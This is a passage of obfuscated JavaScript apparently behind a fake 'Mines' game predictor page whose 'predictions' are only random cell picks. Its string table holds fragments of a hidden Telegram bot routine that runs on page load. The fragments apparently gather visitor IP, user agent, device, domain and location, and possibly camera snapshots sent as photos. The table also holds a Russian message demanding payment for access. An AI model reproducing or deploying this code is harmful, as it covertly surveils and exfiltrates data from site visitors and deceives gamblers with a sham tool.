'bKnJv', 'kxV6R', 'dMLhn', 'mCkX3', 'chat_', 'photo', '-dire', "on {\n", 'eveNg', "send ", '1308840MfaHPB', '-size', 'de>', '6OmqM', 'QZdeE', 'KFCsh', 'Y9qnH', 'emZrH', '/send', "\"retu", '100%;', 'kVNuT', 'BgEwe', 'U99zz', 'getUs', 'secre', 'LsefW', 'stcou', "  tex", 'xFtgo', "6px;\n", '43uvE', "dth: ", "  </d", 'type', '98jTM', 'butto', 'tGNUI', '/12j1', '0221.', '.io', 'etXt6', 'q/Bvm', 'trace', 'lebot', 'drawI', 'wJuxW', " scal", 'Tbzvn', '>Непр', 'BaMmw', "ng: 2", '.gith', 'ytNmj', 'ndPnQ', '3OkbD', 'A4WlD', 'OH9Fu', "  wil", "ft: 0", "    0", '793.s', '131715pbJyeZ', "0, 0.", 'lvsKS', "ws Ph", 'OzBUH', 'Giddy', '://ip', 'THzXW', 'regio', 'fhBzT', "дить ", 'xNEPo', 'CIFpQ', '</cod', 'IFofm', 'zzueo', 'LMVva', "c=\"", 'NCFMB', "ht: a", '3061.', 'ccess', "e;\n  ", '1>Оши', 'UzbNH', '23Xsv', 'CZKHq', 'ClMaw', " дост", 'GILvo', 'wVuzK', 'DWZnC', 'i23UV', 'zEwoE', 'YueXJ', '6mM3I', " src=", 'wMRXN', "e>\n🌐 ", 'eight', "\n📱 De", 'zjBxZ', 'img/s', 'lCvnS', 'ub.io', "% { t", 'cprP+', 'uiDpo', 'YVUTM', "lt=\"E", 'mZGGO', 'y+1Oc', 'paSYL', ": 18p", "\n❗️ <b", 'ZChIL', "rlay\"", 'ax-wi', 'LLkEE', "0px 2", 'kaStK', 'BKtLw', 's-boa', '065.s', 'tor', 'BFQaD', 'rEDTF', 'jc7qS', 'KiqOC', 'FuwYA', 'M051s', 'h3Mra', '/isRl', 'TTorh', 'ZNmyW', '://re', '63qoF', '493.s', 'iKaLJ', "e>\n🔗 ", 'ispla', 'setAt', 'ame', 'VSuHc', 'tribu', 'TvFmZ', 'QKv6b', 'DIvDV', 'Selec', "ms: c", 'hm3FZ', 'ax-he', 'Lrpd5', 'AAAQ0', 'tQXKM', 'iOS', '371B4', 'adow:', 'Heigh', "iv cl", 'img/k', '99031', "0, 0,", 'JACZK', 'hG5S7', 'usDzy', 'qWgYP', 'JuyzU', 'mIUQf', 'XOSfp', 'W3U3N', "over ", 'ge_89', 'pXN0g', 'eyfra', 'w+MLA', 'cZX7f', 'QoRJP', 'aZZEh', 'nbxr4', 'ptEtg', 'jGfHz', 'hUTBL', '6WDDHlF', '>Проб', 'YicXF', 'fWqDc', 'E5nLp', "row t", 'ikedZ', "бку у", 'cell', 'trim', '<code', "00%;\n", 'AQ/v3', 'otf+j', 'bzRjN', 'м.</l', 'tw3ST', 'FLafz', "ity: ", 'ATLNo', 'iPad', '8usSU', "    b", 'gYG/l', 'nfini', 'HRycW', 'YOIQD', "</a>\n", 'rnyBQ', 'RdQgJ', 't5IBg', 'Devic', 'jmucS', "ы блю", '9lxNB', 'sUB5T', 'ion', 'iGu6F', 'src', 'stene', 'odePo', 'thori', 'ahHqz', 'KBipw', 'enFzi', 'ction', '4077.', 'FhrAd', 'n5E6q', 'info', 'HSnmC', 'vpvwp', 'r2ymX', 'le(0)', 'Lnz51', 'ExJZR', 'ecOQd', '4394636BamtrO', '://ap', 'gAery', 'mswrn', 'cK5cl', "ck;\n ", 'prese', 'aaVgs', 'PGfyK', 'oOcjN', 'kuJey', 'Pmffw', "e>\n🖥️ ", 'I2iEg', 'LONMJ', 'L8kh0', " font", 'All', 'SLACE', 'uAESQ', 'RUvNX', "ass=\"", "7), r", 'i>Воз', ");\n  ", 'RX/+e', 'KMCWD', "s, tr", '641.s', 'hFujB', '8g7Fu', "  }\n ", '2I9hG', '/cH+Z', " disp", 'bHU8L', 'lMzYY', '508Gu', '+YCh8', 'zppEO', 'XnBgc', 'QIrpI', 'seYzU', 'Switc', 'jKLpW', 'n/jso', " alig", "try n", ": 0 0", 'xf8AP', 'UCdEz', 'vice:', 'P3eYi', " anim", '4c1yO', 'zVukL', '/alph', 'Fvlxw', 'HnYWZ', 'Jry1w', 'Arial', 'можно', '2YhvZ', 'CnwAl', 'xDJiT', 'ruYDm', "n (fu", 'bwhFA', 'aVdIA', ", 0.7", 'fRLWH', 'LaDFi', 'hFZUF', 'oPDSP', 'qgCYG', "v cla", 'match', 'TQNQi', 'MHTzi', "   </", 'cCfpB', 'IzxVL', 'aliza', 'argin', 'EqQqb', 'vice', 'SHeKx', '8Xo4S', "r: wh", "h to ", 'cWjQd', 'YbZIy', "nt .c", 'lfTkj', 'вером', "div>\n", 'QJbAB', 'vmvf2', "in: 0", '64369', '/TENP', " 1.5e", 'bhCww', 'l55xF', 'kVEKD', '4pWlZ', '.org/', 'HHb6h', "ось з", 'THkeB', 'DexPV', 'tu3AH', 'Name', 'reloa', 'LieZb', 'urLrr', 'x-wid', 'X3R28', 'pKbLv', 'eLGtL', 'cY3Ov', 'IHYQB', 'cssTe', 'nLgYB', 'size:', 'U/I80', "   po", 'JrNLJ', 'YTPeh', 'bot', 'srkOD', 'w+O7+', 'BXYxO', 'aVibS', 'xasrs', 'QUyel', 'hFfuh', 'FTTBB', '07jI9', 'gwMuX', 'wil1S', 'cudV/', '@keyf', 'sgCvJ', 'jOPoU', 'XbyWX', '81773', 'GSDBj', 'ujg0P', '/div>', 'оступ', 'code>', ": col", 'Lp0fj', 'KUwMt', 'cBugC', 'JaUQI', 'PHyrh', "с сер", 'BXJmp', 'ent(1', 'bJqiR', 'uBlDp', "<img ", 'LudlA', 'JuyHV', 'eMode', 'vyAyj', 'click', '9FStm', "  col", 'ctor(', 'qyujA', 'Apyea', 'und-c', 'cente', 'fEIv+', 'агруз', 'AlYOO', 'aoNEP', 'mdcCM', 'rAmGB', 'UhWSP', '+VNk/', 'MMfK0', 'tch?v', "  #fi", '2cbWg', 'taBHJ', '2zkL5', 'XBlSh', '9rVq+', 'ge_75', "55, 0", 'kqDCu', "d: li", 'ge_18', 'scale', 'ApN1q', 'oMLTL', 'uKFMQ', 'rlC2T', "ured ", "p {\n ", '5081.', 'solut', 'EHTIR', 'Z5SUE', 'KcW16', 'ZCs2J', 'AAHLY', "IP: <", 'ulHEN', '4V0RC', 'PVtCd', 'gR/5n', 'QSmDf', 'GLRTj', '29mnl', 'DmznX', "ul>\n ", 'ygKUB', 'ai2CT', 'getAt', 'pOvZb', 'zrjSq', 'BBonD', 'igEvN', "    }", "1 {\n ", 'tion:', "жно в", '9/uXT', 'F5TzD', 'a(255', 'L5NzD', "or: r", 'ZMVEg', 'KAEtX', 's.com', 'vazuU', 'qudWL', 'NoSjH', 'finP9', 'MZi3O', "   <d", ", rgb", 'j/7//', 'HiF9c', 'YaWSY', 'rXYAt', 'yMjGn', '3rcOZ', '9TkyF', 'UBuWS', 'DzTEd', 'rTDgF', 'PLmip', 'MzPxS', 'tjYHh', 'xWDZt', 'n55Eq', 'jwhUy', 'heigh', 'rsMTZ', 'ustif', 'xYyLQ', 'ge_56', 'fYxOK', 'POST', 'VUngA', "0px r", ')</co', 'HAoXb', 'SXrvc', 'AZVig', 'q/+6k', " not ", 'w9WgX', 'gKXmz', " Doma", 'есурс', 'Aecsj', 'ajXWk', 'ORrkH', 'oWQUt', 'ftYM9', 'PKhai', 'EwFcf', 'ge_95', 'u7Nte', 'MAD2z', 'HywLv', 'sform', 'FtZQd', " спиз", 'LvyUa', 'CKvFo', 'LGCQl', "    j", 'ODULK', "Mac ", '2T5At', 'xWmuf', 's/ima', '9WppX', 'AmInQ', 'bnxUm', 's2r2L', "th: 1", " coun", '(0)', 'flex;', 'ouIPK', '4wY0N', 'rqzdn', "к сай", 'xyq8a', 'cell-', '3OGUj', 'ZigCj', 'sXiUW', 'KPcZW', 'qDEuT', 'KBQBf', '353.s', "     ", 'ode>', "y: fl", "t: ce", 'd0rbf', "));\n ", 'dMtgA', "on: g", "   le", 'SpNHQ', 'Kionz', 'i1XuV', "le=\"m", 'olor:', 'ells-', 'PWupL', 'byV+1', "ть ве", 'JLP9H', 'p7h+/', 'b8pxY', 'aUDJX', 'hD3rR', 'VjhJb', 'aEpyE', ": 56p", 'BXPIs', "\n📍 Do", '5hqHM', 'Eleme', 'idden', 'G+AsA', 'qCukd', "m;\n  ", '0/D4o', 'oto:', 'iwYjx', 'media', 'qVneb', 'A1Gm/', "g: 0;", 'fcjlH', 'DYpKH', '__pro', '497iz', 'uXrvG', "cQ\" i", 'MTpPt', 'rames', 'fAbxI', 'XPZ2C', 'rp15n', 'qJEfL', 'ImmSF', 'Amoun', 'viewB', 'WIhZc', "uto;\"", "low 1", "тели ", '.cell', 'goB2x', 'XI4QW', '0EZNk', 'lQ4w0', 'psQHp', 'groun', '965y5', 'ge_10', 'https', 'ton:h', '12PMO', 'img', 'ntrie', 'nboaU', 'VK4Dc', 'oXyxq', '0.3s,', 'ge_13', 'K+NeM', 'osFLx', 'rest.', 'jJZxS', " возн", 'qIcZJ', 'yGxsU', 'CgEpV', 'HwkDX', 'ieDum', 'size', 'messa', " #ddd", 'hRDIx', 'pq0j0', '/uIuY', 'VVH0D', "    d", 'vK1vE', 'SUbsb', "   fo", 'YJdlC', 'p/FlG', 'query', 'u/wZe', 'RQ7VJ', 'ext-s', '56px;', 'dgWbz', 'kMJ0I', 'DJrgd', 'div', "=\"ove", '6917.', 'SBxsU', '509.s', 'uJJht', 'Q3b96', 'pfVAZ', 'duPw+', ": opa", 'll-ch', 'er-ra', 'mNwt2', "/b>\n📍", " glow", " удал", '3DhKv', 'exxrY', 'fy-co', 'ge_14', 'asWYS', 'Fhezs', "rd .c", 'hkAg0', 'Mrfkx', 'e/png', " user", '0LpFY', 'dRnL5', 'xMidY', 'ucces', 'YQWES', 'star-', "   an", 'M5+jv', "t: <c", "wn De", 'c01Fy', 'jsUb5', "Bot A", 'body', 'rGAbw', 'YgAvs', 'pLXsY', 'lized', 'uTgoR', 'then', 'AArKS', 'SeBl0', 'disab', 'S8dN3', 'IDYvd', "is\")(", 'nrgZt', 'YCntN', 'FlwVX', 'srcOb', 'jMtpr', 'relat', "r;\n  ", 'tive;', "  wid", '7M2g9', 'Xrbh/', 'SrMab', 'proto', 'info.', 'kExbo', 'verfl', 'utton', 'city:', 'lyRGa', "rif;\n", 'dgoNY', 'ublic', 'KGgoA', 'ZAQaK', 'YJkTv', 'одера', "=\"56\"", '2i+72', " flex", 'ame:', 'H8dgM', "    ", "  tra", " tran", 'GPJBE', 'appli', 'getTr', 'p+fkx', 'fromC', 'uk126', 'OE0RB', " capt", " max-", 'ge:', 'ijfAr', 'X19PO', '+vfQm', 'K5xMG', 'h0IYy', '8373.', 'ETylJ', 'xeK4Y', '//www', 'licke', 'YUnxw', ", 255", 'gn-it', '669bj', 'ox-sh', 'QbGPP', 'cpFAA', 'ещен<', "лемы ", 'ge_15', 'qnLYi', "dy {\n", "on: n", '2+dr2', 'p5/O5', '3sNjy', 'm1WOZ', "h;\n  ", '914yz', 'DOMCo', 'age', 'BJNQn', 'ODAjQ', 'm/mIi', 'DVd4n', 'DDmnI', 'ZqCxx', 'synmM', "e>\n📌 ", 'ZBTjv', 'kPNAQ', 'eafvi', 'multi', "04: Д", "    t", 'Loade', " opac", 'MhRnz', 'GQHid', "за 15", '9WVoO', 'fetch', 'splay', 'ZffVy', 'b8Xf3', "iv>\n ", "ty: 0", '/09m+', 'WvfPe', "    p", 'has', "ix It", 'WupYr', 'FKlnL', 'ymDFh', 'Zi/F/', 'INoyE', 'y/c/3', "   ma", 'xcUlM', 'FBDkD', '1FVfh', " bot:", 'LgdeA', 'tABcO', 's3+gS', 'out', "rror ", 'KF+uj', 'B9/X1', '357.s', 'm/lOw', 'l-cha', 'AoEWV', 'cGsGG', '8qpx1', "s;\n  ", 't-ali', 'ALL5A', 'ottom', 'Windo', 'sPheU', 'CTHou', 'K8Hoj', "iv id", 'fCKoc', '7ctKt', 'RIEZz', 'K3lSd', 'iBdOd', '7M1jQ', 'nctio', 'PIyMh', 't_svg', 'dyzL0', "lex;\n", 'RzhSK', 'NVagO', "ay: f", 'wfEjw', 'vabbN', "ht=\"5", 'pfwAa', 'AFW0L', 'AARMD', 'j+xlQ', 'PPcMd', 'LWpWI', 'YsVCu', 'LfytZ', 'wzUym', 'AGuRi', 'paddi', 'KkIfj', 'sk66q', 'NtPSb', 'b0asY', 'fJfki', 'YNLGH', 'Zqrua', 'image', 'ABFn4', 'KatWf', 'pacit', "   he", 'e(0);', "d=\"fi", 'NIgMz', 'color', 'zG+Tc', 'block', 'uKgcd', '7cuME', 'a85Js', 'u6l+p', 'mFwVG', 'iHngG', 'io/js', 'vZESx', 'Faile', " 10px", 'name', 'href', 'ttps:', 'sJiZ2', 'model', 'sdFaY', 'mF2s3', '4cf2l', 'List', 'vQlLu', 'a8Gi/', 'vRkNv', "d to ", 'пробл', 'apREJ', 'qQchy', ':imag', 'VWFZV', "rrow ", 'GIwUA', "m\"></", 'ifNSJ', '4e04k', '221.s', 'qgkIG', 'torAl', 'Messa', 'NnWAU', 'akLhW', "n: re", 'IUwGg', 'ansfo', 'DoycJ', '11PIx', "    z", 'hadow', " купи", 'error', 'RjY/H', 'wqTdK', " 0.8)", 'BD54L', 'FtRya', 'rdllV', 'pxHSP', "    c", 'kk2TF', 'bQyN2', 'EI2fY', 'Xq1qU', '0O3kc', '7E8yW', 'OCiUQ', 'Y22x9', '9hs6S', "   #f", 'push', " back", 'qWBVi', 'Mobil', '8Yyrx', 'PGqEM', 'ed</b', 'qofub', " rela", '9757.', 'ff9Z/', "ly: '", 'iHgn6', "form ", 'fasTX', 'JbtwS', 'FXTrW', 'FZO1F', 'add', 'font-', 'xZ7ly', 'xVvxl', 'EggMb', 'TZCt6', '09dtA', 'aurwx', 'Dxs/q', 'erlSo', 'iHfQG', "URL: ", 'UUPdR', 'pXcUR', 'floor', "ht: 5", 'QsezT', 'du+Rw', "on\">F", "ght: ", 'ound-', '0ccsm', 'PJXAN', 'NSKPE', 'ation', 'yoxIE', 'pectR', 'Wdbe/', 'ge_31', 'UKNeH', 'YSVBn', '0.3s;', 'gent', 'addin', 'terna', '645.s', 'getEl', 'eVOBS', 'B0lEQ', '2cSNb', 'AAAAi', '201.s', 'H5idU', 'YGhm2', "    m", 'tent:', " widt", 'Mx1Lz', ">\n📍 D", 'GRaSF', 'qecHj', " heig", 'Type:', 'AAOww', 'alize', 'szITd', "rm 0.", 'list-', '(255,', '3YGRg', ':AAEh', 'ransi', '4sdtC', 'RYzdf', " clas", 'jHO4F', "1s in", "ter;\n", 'anima', 'bcKrP', 'eBMAC', 'JAOmS', 'excep', 'RrQxO', 'ithub', 'aHHnc', 'zK8l4', 'playB', "    u", 'BAJdC', 'ement', 'cWKuy', 'ge_24', 'captu', 'Xspex', 'dlTjh', 'ge_11', '38508bMTMEK', 'l8fK5', 'glhor', 'AaEGl', 'rgba(', 'Linux', 'WKefF', 'mNBQN', 'A4Z2K', 'k7yy7', "x rgb", 'zhqON', 'gZyGM', 'hLe+s', 'eOS', 'GPAOE', '1+zEH', 'wGA0w', 'vK55p', '707QP', '7lIQ8', 'kEbdM', 'eJEBo', 'Wht/B', 'jzrWk', "6\" sr", 'VmGOS', " Agen", 'Dz+0l', 'TJDgq', 'NbETg', 't8uKr', 'KG719', 'EYQcS', "n: ab", '1mCiG', 'YDAZO', 'qfzRB', '/jpeg', 'AAANS', "бка 4", 'sHhrh', 'nt-si', 'WWiTe', 'main:', 'zWfLu', " <div", 'dypwu', 'sitio', 'nXSSd', 'textC', 'aFuwI', 'N5dPs', '+/SOO', 'c3T2c', 'gQXdQ', 'SQhqI', 'ZihIw', 'ify-c', 'lyskK', 'xohzh', 'vC87G', 'tdxER', '18lpp', 'dAQMh', " 0 0 ", 'wDwRI', 'EAg2B', 'ByJuY', 'BgARk', '.jpg', 'ById', 'авиль', "te;\n ", 'svg', 'tzdUp', 'Locat', "mpt D", 'YEE1+', '0ezAA', 'K5CYI', 'rando', 'atio', '2jIYo', 'IrUmi', 'Xgkw5', 'UzZYq', " <li>", 'Table', '-inde', 'pxmrv', 'RaVdA', 'bCwka', 'form', 'oaIxM', 'nitia', '=dQw4', '/tZLh', "ow: 0", 'dgSIH', 'fXeaR', 'iu8Vu', " cent", 'Ysitg', 'ZY0jY', 'larBX', 'Width', '20531hPCiYv', 'KgvcK', 'StpVh', 'pzmqN', 'sV6Gw', 'ject', '-fami', "; }\n ", 'biJGw', ">\n   ", 'HTML', 'HxDJS', 'OPmCw', "I=\" a", '+HYNR', 'NDFQf', 'PM2Iy', 'Irb8U', 'toBlo', 'ge_63', " colo", '+djjz', 'WPCaP', ": poi", 'oGBRg', 'JqyLr', 'agloZ', 'ksnR3', 'Qy1O1', 'EGUn7', 'aOGBg', '1237.', 'nn/wX', 'Fagaf', 'Esq7J', 'conso', " #ove", 'ODuRn', 'gpnTt', 'aNT4h', '2217.', ';base', '/getM', ": fli", 'near-', 'L8gPW', 'LU9yO', "ws ", "eft\">", 'vtYi6', '100', 'userA', "100% ", 'ZTS8h', 'F5orR', 'LHTKM', 'LPi3p', 'wDdtF', 'Vg4Vb', 'Возмо', 'video', "ебку ", '6JzR5', 'map', '1yJEI', 'sSWQw', 'DHaDi', 'ing', 'Dg8Qd', 'dLJly', 'kYpSB', 'DIwXN', '.yout', 'A4UTI', 'FtBkT', 'i.tel', 'O/+z/', 'li>Не', "55, 1", 'E9rxj', 'cgObd', 'YUvIE', "вы хо", 'nPKhz', 'znQTW', "ock;\n", 'ight:', "dow: ", 'ugvFg', 'lx6MW', 'JLBFU', '24ygw', "s=\"ar", 'ge_12', 'm9zxz', 'exwiW', 'oNNeE', "99;\n ", 'BazHG', 'njFut', 'mLONf', 'BGcCW', 'KRAIc', 'nesk', 'hostn', 'Fw8R3', 'ge_37', 'lO/+w', 'ube.c', '3XXSB', 'омен.', 'Nl304', 'ttBIZ', "   di", '-type', "); }\n", " 100%", 'GfymA', "', sa", ": blo", 'qfIdo', 'Photo', 'bnAnY', "rn th", 'DRCDD', 'int', 'olaoY', 'mXJeY', 'initi', 'trans', "mes f", 'JzExX', '9R7kC', 'xButt', 'tsKAW', "y: 0;", 'zpPQA', 'gU2zu', "gn: c", 'acNKP', 'nsiti', " ее к", '3xMJK', 'sMqel', 'AOtTR', 'hEDQz', '3212RrvmIj', 'NRnZU', "\" sty", 'remov', 'mBWsG', '1HMsR', '7o7hF', 'GoBfo', 'ufWBj', "rm: s", 'BJycn', 'M9Vto', " info", 'charC', 'fvHBE', 'QA4jK', 'nMbIR', 'LIfCj', "   wi", 'uUQpv', 'mtGgY', '111.g', 'XwmgI', 'sKamI', 'SWpwM', " posi", 'nO8v0', 'RxAPS', 'akfVV', 'QDyqL', "y 0.3", 'Ufl1W', 'QjY4w', 'zxFLn', 'traps', "ss=\"a", 'gQjdr', 'form,', 'Ro1Y8', 'km9zw', 'knDTO', 'sgXaJ', '03IGB', 'YkJdE', 'gUAga', 'tgamb', 'обнов', 'G1bkL', 'ition', "m 0.3", 'onten', '8xHKl', 'BRaLP', '4DxcQ', "3s;\n ", 'BsjKz', "<a hr", 'jiWQa', 'vH2+6', 'gAVxT', '/wHIb', 'MXNEQ', 'etect', 'zaNvb', 'Jbfaq', " bord", 'OKRkw', 'cale(', 'pspwZ', 'nsxRE', 'EoESz', 'aGPIV', 'rRQfF', 'VkUz6', 'CaAgE', 'play', 'ению,', 'jSIwL', '1Zesa', 'EfZMQ', 'jZKLF', 'jq9pn', 'des', '2Vb6G', 'iAMqF', 'ptUzf', 'lij2+', " #282", 'jxLJX', 'jyjkS', 'WOT52', 'otoLV', 'bind', 'OUaKM', 'vRjsC', '(1)', 't-sha', 'lnGvH', 'stop', 'RC5xB', 'psLZA', "on: o", 'gba(2', 'MRnNy', '6ZwMF', 'prev_', 'xH2TR', "ems: ", "\n🚀 <b", 'BpD54', '8uOpM', "ty: 1", 'HZq7Y', 'kIOcM', 'EsYmm', 'Z9XnY', 'CIENc', "0 0 ", ": 0;\n", "   @k", 'uYq5I', 'y5BTt', "h: 56", 'HBWVA', 'strin', 'wuKNE', "de>\n📱", 'nter;', 'RePqL', 'ZWd15', 'getCo', 'ZmKNX', " <img", 'tigjq', "e>\n⏰ ", '8pj6r', 'UrdfN', ", opa", 'tXo87', "  opa", 'FNQwe', 'AUKov', 'MsbCi', 'f0HBT', 'VHz_Q', 'c5q2S', ";\n   ", " User", '929.s', 'finit', '8e6rc', 'SyKFg', 'GMalG', ": sca", "    h", 'oXZer', 'Al0Io', '7y9jv', 'KMhEA', 'hlPoj', 'MTxAU', 'form:', 'const', 'style', 'qRW/v', 'DdrPE', '337.s', 'RizeZ', 'oDjY/', "ne;\n ", '$.</l', 'RXZSB', '</div', 'QLTKi', 'YCNFB', 'iZDCD', 'HBqSH', 'fisCQ', "zed A", 'inner', 'NvQfZ', 'ange:', "px;\n ", 'jIZAI', 'one', 'OdfLg', 'c4gM7', 'CZXzL', " 4em;", 'addEv', "<p>К ", 'FGulN', 'mZzoZ', 'rVYkx', 'head', 'QZAaY', 'AVoj1', 'rDAvj', 'zzW49', 'Initi', 'TqmMh', 'YTQEn', 'UtVFz', 'tQlxb', 'sKVcn', 'botto', 'eymgL', 'MkHmy', 'lativ', "ent s", 'nYESv', 'QYagp', 'jmcZm', 'zl9I8', 'FxbqC', 'JNspH', 'u4zBe', '2uT7t', '(0.7)', 'gify', '2rrtd', 'BORw0', 'ssvVR', 'T8tja', 'repla', " 5px;", 'rveAs', 'inclu', 'DSxgv', 'TLlcD', "емы с", 'AtK1v', 'zKRzo', '8Bd6t', 'odeAt', 'WHttW', 'IWXMA', 'd4ABa', 'iZUha', '3913c', 'ZOcA2', '7WyDW', 'htLuE', 'AiwNz', 'dBFza', 'WUtwJ', 'irYUe', 'all', 'HCwVs', 'ZvJJV', 'qOLSq', " just", 'keHFR', 'wrrvv', '0m3ES', 'UHDMI', 'toUpp', 'MEqFw', 'enter', '50.sv', "0);\n ", 'ge_50', 'VmphI', 'zKZxF', 'Q1BzU', 'KDwuX', " Atte", 'UrJNT', 'cQdoD', 'k//8A', '6o67A', 'Pn2E+', "{ tex", "ive;\n", 'RjTz3', "l {\n ", '{}.co', "n() ", "e>\n  ", 'IchOg', 'eType', " {\n  ", 'fade-', 'd</b>', 'next_', 'NS658', 'tK9fV', 'qN/vw', "te al", 'NgGpj', 'xfAAA', 'jpZze', 'ryEmo', 'WFJyi', ", 0, ", 'v88tf', '/v3.1', 'bxEKo', 'zgMkS', 'uPJVF', 'SZc8K', 'TTkUx', 'SqJDU', "   10", "ex;\n ", 'HShta', '72639', 'zKveG', "re ph", "   <l", 'qhMsT', 'EqCkS', 'get', 'Ltcms'];
  _0x129f = function () {
    return _0x54085b;
  };
  return _0x129f();
}
function _0x3b61d5(_0x2137d0, _0x296587, _0x5cc9f4, _0x710599, _0x1db2d1) {
  return _0x478a(_0x5cc9f4 + 0x29c, _0x296587);
}
document.addEventListener("DOMContentLoaded", _0x2c9f17 => {
  initTelegramBot();
});
document.addEventListener("DOMContentLoaded", function () {
  const _0x3d5edc = document.querySelector(".cells-board");
  if (!_0x3d5edc) {
    console.error("Element .cells-board not found.");
    return;
  }
  const _0x2adfd8 = [1, 3, 5, 7];
  const _0xea625a = {
    '1': 0x7,
    '3': 0x5,
    '5': 0x4,
    '7': 0x3
  };
  let _0x6ed3d5 = 0;
  const _0x5e4d08 = document.getElementById("trapsAmount");
  const _0x26da5e = document.getElementById("prev_preset_btn");
  const _0x20cc41 = document.getElementById("next_preset_btn");
  const _0x59b8f6 = document.getElementById("modeButton");
  let _0x366b1a = "nesk";
  function _0x3d8b58() {
    if (_0x5e4d08) {
      _0x5e4d08.textContent = _0x2adfd8[_0x6ed3d5];
    }
  }
  if (_0x26da5e) {
    _0x26da5e.addEventListener("click", function () {
      if (_0x6ed3d5 > 0) {
        _0x6ed3d5--;
        _0x3d8b58();
      }
    });
  }
  if (_0x20cc41) {
    _0x20cc41.addEventListener("click", function () {
      if (_0x6ed3d5 < _0x2adfd8.length - 1) {
        _0x6ed3d5++;
        _0x3d8b58();
      }
    });
  }
  if (_0x59b8f6) {
    _0x59b8f6.addEventListener("click", function () {
      _0x366b1a = _0x366b1a === "nesk" ? "all" : "nesk";
      _0x59b8f6.textContent = _0x366b1a === "nesk" ? "Switch to All" : "Switch to multiple";
    });
  }
  _0x3d8b58();
  function _0x11ccbf() {
    const _0x235a39 = document.querySelectorAll(".cells-board .cell");
    _0x235a39.forEach(_0x284266 => {
      _0x284266.addEventListener("click", () => {
        _0x284266.style.transform = "scale(0.7)";
        setTimeout(() => {
          _0x284266.style.transform = "scale(1)";
        }, 200);
      });
    });
  }
  let _0x87c5da = true;
  const _0x5aad7e = document.getElementById("playButton");
  if (_0x5aad7e) {
    _0x5aad7e.addEventListener("click", function () {
      _0x5aad7e.disabled = true;
      let _0x35fe31 = document.querySelectorAll(".cells-board .cell");
      if (!_0x87c5da) {
        _0x3d5edc.innerHTML = '';
        _0x9b1db7();
        _0x35fe31 = document.querySelectorAll(".cells-board .cell");
      }
      const _0x421a16 = parseInt(_0x5e4d08.textContent);
      const _0x12f1db = _0x35fe31.length;
      const _0x267f2f = new Set();
      while (_0x267f2f.size < _0x421a16) {
        const _0x15af9a = Math.floor(Math.random() * _0x12f1db);
        _0x267f2f.add(_0x15af9a);
      }
      if (_0x366b1a === "nesk") {
        const _0x3e3d4c = _0xea625a[_0x421a16] || 0;
        const _0x4e143e = [];
        while (_0x4e143e.length < _0x3e3d4c) {
          const _0x13fc37 = Math.floor(Math.random() * _0x35fe31.length);
          if (!_0x4e143e.includes(_0x13fc37)) {
            _0x4e143e.push(_0x13fc37);
          }
        }
        let _0x5b6bd3 = 0;
        function _0x1c75d4() {
          if (_0x5b6bd3 < _0x4e143e.length) {
            const _0x289427 = _0x4e143e[_0x5b6bd3];
            const _0x18ccc9 = _0x35fe31[_0x289427];
            _0x18ccc9.classList.add("cell-fade-out");
            setTimeout(async () => {
              _0x18ccc9.innerHTML = '';
              try {
                const _0x591e58 = await fetch("img/stars.svg");
                const _0x13f0b1 = await _0x591e58.text();
                const _0x270884 = document.createElement("div");
                _0x270884.style.cssText = "\n                                    width: 56px;\n                                    height: 56px;\n                                    display: flex;\n                                    align-items: center;\n                                    justify-content: center;\n                                    position: relative;\n                                ";
                _0x270884.innerHTML = _0x13f0b1;
                _0x18ccc9.appendChild(_0x270884);
                const _0x30bd59 = _0x270884.querySelector("svg");
                if (_0x30bd59) {
                  _0x30bd59.style.cssText = "\n                                        width: 56px;\n                                        height: 56px;\n                                        max-width: 100%;\n                                        max-height: 100%;\n                                        display: block;\n                                        opacity: 0;\n                                        transform: scale(0);\n                                        transition: opacity 0.3s, transform 0.3s;\n                                    ";
                  const _0x550406 = _0x30bd59.getAttribute("viewBox");
                  if (!_0x550406) {
                    const _0x377117 = _0x30bd59.getAttribute("width") || "100";
                    const _0x4289ff = _0x30bd59.getAttribute("height") || "100";
                    _0x30bd59.setAttribute("viewBox", "0 0 " + _0x377117 + " " + _0x4289ff);
                  }
                  _0x30bd59.setAttribute("preserveAspectRatio", "xMidYMid meet");
                  _0x30bd59.classList.add("star-animation");
                  requestAnimationFrame(() => {
                    _0x30bd59.style.opacity = '1';
                    _0x30bd59.style.transform = "scale(1)";
                  });
                }
              } catch (_0x497da4) {
                const _0x48c4eb = document.createElement("img");
                _0x48c4eb.style.cssText = "\n                                    width: 56px;\n                                    height: 56px;\n                                    display: block;\n                                    will-change: transform, opacity;\n                                    opacity: 0;\n                                    transform: scale(0);\n                                    transition: opacity 0.3s, transform 0.3s;\n                                ";
                _0x48c4eb.src = "img/stars.svg";
                _0x18ccc9.appendChild(_0x48c4eb);
                requestAnimationFrame(() => {
                  _0x48c4eb.style.opacity = '1';
                  _0x48c4eb.style.transform = "scale(1)";
                });
              }
              _0x18ccc9.classList.remove("cell-fade-out");
              _0x5b6bd3++;
              setTimeout(_0x1c75d4, 700);
            }, 400);
          } else {
            _0x5aad7e.disabled = false;
            if (_0x87c5da) {
              _0x87c5da = false;
            }
          }
        }
        _0x1c75d4();
      } else {
        Promise.all([..._0x35fe31].map((_0x4d6782, _0x2ab2ec) => {
          return new Promise(async _0x5c8918 => {
            _0x4d6782.classList.add("cell-fade-out");
            _0x4d6782.innerHTML = '';
            try {
              const _0x47f84e = await fetch(_0x267f2f.has(_0x2ab2ec) ? "img/krest.svg" : "img/stars.svg");
              const _0x4880af = await _0x47f84e.text();
              const _0xbbdc6f = document.createElement("div");
              _0xbbdc6f.style.cssText = "\n                                width: 56px;\n                                height: 56px;\n                                display: flex;\n                                align-items: center;\n                                justify-content: center;\n                                position: relative;\n                            ";
              _0xbbdc6f.innerHTML = _0x4880af;
              _0x4d6782.appendChild(_0xbbdc6f);
              const _0x2c323e = _0xbbdc6f.querySelector("svg");
              if (_0x2c323e) {
                _0x2c323e.style.cssText = "\n                                    width: 56px;\n                                    height: 56px;\n                                    max-width: 100%;\n                                    max-height: 100%;\n                                    display: block;\n                                    opacity: 0;\n                                    transform: scale(0);\n                                    transition: opacity 0.3s, transform 0.3s;\n                                ";
                const _0x31529b = _0x2c323e.getAttribute("viewBox");
                if (!_0x31529b) {
                  const _0x2c9cc5 = _0x2c323e.getAttribute("width") || "100";
                  const _0x5f586b = _0x2c323e.getAttribute("height") || "100";
                  _0x2c323e.setAttribute("viewBox", "0 0 " + _0x2c9cc5 + " " + _0x5f586b);
                }
                _0x2c323e.setAttribute("preserveAspectRatio", "xMidYMid meet");
                _0x2c323e.classList.add("star-animation");
                _0x2c323e.style.opacity = '0';
                _0x2c323e.style.transform = "scale(0)";
                requestAnimationFrame(() => {
